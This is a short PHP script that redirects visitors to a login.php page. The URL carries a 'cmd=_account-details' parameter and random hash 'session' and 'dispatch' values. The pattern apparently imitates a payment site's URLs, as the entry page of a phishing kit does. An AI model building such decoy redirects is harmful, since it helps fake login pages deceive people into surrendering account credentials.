<?php

header("Location: login.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>